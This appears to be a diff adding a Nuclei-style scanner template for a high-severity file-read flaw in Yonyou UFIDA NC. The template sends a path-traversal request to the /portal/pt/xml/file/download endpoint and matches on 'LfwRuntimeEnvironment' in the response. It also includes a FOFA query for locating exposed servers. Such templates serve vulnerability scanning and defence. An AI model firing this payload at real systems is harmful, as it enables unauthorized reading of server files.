@@ -1,0 +1,30 @@
+id: yonyou-nc-pt-xml-file-download-fileread
+info:
+  name: 用友 UFIDA NC pt/xml/file/download - fileread
+  author: leadlife
+  severity: high
+  description: 
+  reference:
+    - todo
+  metadata:
+    verified: true
+    fofa-query: icon_hash="1085941792" || app="用友-UFIDA-NC"
+  tags: yonyou, fileread, nc, oa
+
+variables:
+  num: '{{rand_int(800000000, 1000000000)}}'
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/portal/pt/xml/file/download?pageId=login&filename=..%5Cindex.jsp"
+    
+    matchers:
+      - type: dsl
+        dsl:
+          - "status_code == 200"
+          - "contains_all(body,'LfwRuntimeEnvironment')"
+        condition: and
+      
+
+
